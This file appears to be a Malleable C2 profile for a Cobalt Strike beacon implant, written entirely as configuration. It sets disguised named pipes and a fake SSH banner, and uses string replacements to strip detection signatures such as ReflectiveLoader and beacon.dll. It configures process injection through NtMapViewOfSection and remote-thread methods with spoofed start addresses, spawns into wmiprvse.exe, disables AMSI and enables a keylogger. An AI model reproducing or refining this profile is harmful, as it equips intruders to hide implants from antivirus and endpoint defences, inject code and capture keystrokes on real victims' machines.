###SMB options###
set pipename "notacsbeacon##";
set pipename_stager "notacsbeaconstg##";
set smb_frame_header "";


###TCP options###
set tcp_port "8001";
set tcp_frame_header "";


###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###Steal Token
set steal_token_access_mask "11";

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "5 May 2023 10:52:15";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    set name	        "srv.dll";


    set userwx 	        "false";
    set cleanup	        "true";
    set stomppe	        "true";
    set obfuscate	    "true";
    set sleep_mask      "true";
    set rich_header     "\x71\xd5\xdf\x19\x38\x77\xab\x8d\x2b\x41\x5e\xcb\x98\x22\x05\x90";
    
    set smartinject     "true";
    
    #set allocator "HeapAlloc";
    set magic_pe "EA";
    set magic_mz_x64    "MZRE";
    set magic_mz_x86    "MZAR";


    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        }

    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "Stack around the variable" "";
        strrep "was corrupted." "";
        strrep "The variable" "";
        strrep "is being used without being initialized." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "Stack memory was corrupted" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around" "corrupted";
        strrep "operator" "";
        strrep "operator co_await" "";
        strrep "operator<=>" "";
        strrep "(admin)" "(adm)";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x48\x81\xEC\x20\x00\x00\x00\x48\x8D\x1D\xEA\xFF\xFF\xFF\x48\x89\xDF\x48\x81\xC3\xA4\x6E\x01\x00\xFF\xD3\x41\xB8\xF0\xB5\xA2\x56\x68\x04\x00\x00\x00\x5A\x48\x89\xF9\xFF\xD0" "\x4D\x5A\x48\x8D\x1D\xF8\xFF\xFF\xFF\x41\x52\x48\x83\xEC\x28\x48\x89\xDF\x48\x81\xC3\x52\xB7\x00\x00\x48\x81\xC3\x52\xB7\x00\x00\xFF\xD3\x48\xC7\xC2\x04\x00\x00\x00\x48\x89\xF9\xFF\xD0";
        }
}

###Process Inject Block###
process-inject {
    set allocator "NtMapViewOfSection";
    set bof_allocator "MapViewOfFile";
    #set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "false";
    set min_alloc "16700";
    set userwx "false";  
    set startrwx "false";
        
    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }
    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        SetThreadContext;
        NtQueueApcThread-s;
        #NtQueueApcThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        #CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set keylogger "SetWindowsHookEx";
}
